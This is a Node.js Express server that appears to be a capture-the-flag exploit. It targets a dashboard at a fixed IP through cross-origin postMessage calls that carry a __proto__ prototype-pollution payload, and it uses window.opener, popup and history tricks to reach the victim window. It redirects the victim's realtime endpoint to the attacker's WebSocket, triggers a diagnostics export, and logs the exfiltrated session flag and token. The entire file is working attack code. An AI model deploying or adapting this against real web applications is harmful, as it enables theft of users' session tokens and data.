const express = require('express');
const expressWs = require('express-ws');

const app = express();
expressWs(app);

const PORT = process.env.PORT || 10000;
const TARGET = 'http://34.118.127.209:35666/';

// ── GET / ── Landing page: comprehensive attack + diagnostics ──
app.get('/', (req, res) => {
  const host = req.headers.host || req.hostname;
  const wsUrl = 'wss://' + host + '/ws';
  res.type('html').send(`<!DOCTYPE html>
<html><body>
<script>
function L(m){try{new Image().src='/log?'+encodeURIComponent(m)+'&_='+Date.now();}catch(e){}}

var PP = JSON.parse('{"__proto__":{"telemetryConsent":true,"channelMode":"ws","realtimeEndpoint":"${wsUrl}"}}');

// ═══ DIAGNOSTICS ═══
L('land|hist='+history.length+'|ref='+document.referrer+'|opener='+(window.opener?'YES':'NO'));

// ═══ ATTACK 1: window.opener (if bot opened us as popup from dashboard) ═══
if(window.opener){
  L('HAS_OPENER');
  try{L('opener_loc='+window.opener.location.href);}catch(e){L('opener_cross');}
  try{L('opener_len='+window.opener.length);}catch(e){L('opener_len_err');}

  // Attack opener immediately (it might be the dashboard!)
  function attackOpener(){
    try{
      window.opener.postMessage({type:'prefs:update',payload:{theme:PP}},'*');
      L('op_pollute');
    }catch(e){L('op_pollute_err');}
    setTimeout(function(){
      try{
        window.opener.postMessage({type:'diagnostics:export'},'*');
        L('op_trigger');
      }catch(e){L('op_trigger_err');}
    },500);
  }
  // Multiple rounds
  [500,2000,4000,6000,9000].forEach(function(d){setTimeout(attackOpener,d);});
}

// ═══ ATTACK 2: open helper + history.back (if bot visited dashboard before us) ═══
var helper = window.open('/helper');
L('helper='+(helper?'ok':'null'));

if(history.length > 1){
  L('going_back');
  // delay slightly so helper can load
  setTimeout(function(){ history.back(); }, 300);
}

// ═══ ATTACK 3: open dashboard directly (popup fallback) ═══
var dashpop = null;
try {
  dashpop = window.open('${TARGET}', 'dashwin');
  L('dashpop='+(dashpop?'ok':'null'));
} catch(e){ L('dashpop_err='+e.message); }

function attackDashPop(){
  if(!dashpop||dashpop.closed){return;}
  try{L('dp_len='+dashpop.length);}catch(e){L('dp_len_err');}
  try{
    dashpop.postMessage({type:'prefs:update',payload:{theme:PP}},'*');
    dashpop.postMessage({type:'diagnostics:export'},'*');
    L('dp_attack');
  }catch(e){L('dp_err='+e.message);}
}
[3000,5000,8000,12000].forEach(function(d){setTimeout(attackDashPop,d);});

</script>
</body></html>`);
});

// ── GET /helper ── Popup that attacks window.opener ──
app.get('/helper', (req, res) => {
  const host = req.headers.host || req.hostname;
  const wsUrl = 'wss://' + host + '/ws';
  res.type('html').send(`<!DOCTYPE html>
<html><body>
<script>
function L(m){try{new Image().src='/log?'+encodeURIComponent(m)+'&_='+Date.now();}catch(e){}}
L('helper_loaded');

var PP = JSON.parse('{"__proto__":{"telemetryConsent":true,"channelMode":"ws","realtimeEndpoint":"${wsUrl}"}}');

function attack(){
  if(!window.opener){L('h_no_opener');return;}

  var co=false;
  try{window.opener.location.href;L('h_same');}catch(e){co=true;L('h_cross');}
  try{L('h_len='+window.opener.length);}catch(e){L('h_len_err');}

  // Always fire postMessage (works cross-origin)
  try{
    window.opener.postMessage({type:'prefs:update',payload:{theme:PP}},'*');
    L('h_pollute');
  }catch(e){}
  setTimeout(function(){
    try{
      window.opener.postMessage({type:'diagnostics:export'},'*');
      L('h_trigger');
    }catch(e){}
  },600);

  // Also try reaching named window 'dashwin'
  try{
    var dw=window.open('','dashwin');
    if(dw&&dw!==window&&dw!==window.opener){
      L('h_dashwin');
      dw.postMessage({type:'prefs:update',payload:{theme:PP}},'*');
      setTimeout(function(){dw.postMessage({type:'diagnostics:export'},'*');},500);
    }
  }catch(e){}
}

var n=0;
var iv=setInterval(function(){
  n++;attack();L('h_att_'+n);
  if(n>=20)clearInterval(iv);
},2000);
</script>
</body></html>`);
});

// ── POST /log ── accept sendBeacon (POST) too ──
app.post('/log', (req, res) => {
  console.log('[beacon:post]', req.originalUrl);
  res.status(204).end();
});

// ── GET /log ── beacon logger ──
app.get('/log', (req, res) => {
  var raw = req.originalUrl.replace(/^\/log\?/,'').replace(/&_=\d+$/,'');
  console.log('[beacon]', decodeURIComponent(raw));
  res.status(204).end();
});

// ── WS /ws ── receive exfiltrated diagnostics ──
app.ws('/ws', (ws, req) => {
  console.log('[ws] connection from', req.ip);
  ws.on('message', (data) => {
    console.log('\n' + '='.repeat(62));
    console.log('  EXFILTRATED DIAGNOSTICS BUNDLE');
    console.log('='.repeat(62));
    try {
      const d = JSON.parse(data);
      console.log(JSON.stringify(d, null, 2));
      const s = d.session || {};
      if (s.flag) console.log('\n  >>> FLAG  =', s.flag);
      if (s.token) console.log('  >>> TOKEN =', s.token);
    } catch(e) {
      console.log(String(data).slice(0, 2000));
    }
    console.log('='.repeat(62) + '\n');
  });
  ws.on('close', () => console.log('[ws] closed'));
});

app.listen(PORT, () => {
  console.log('Listening on port', PORT);
});
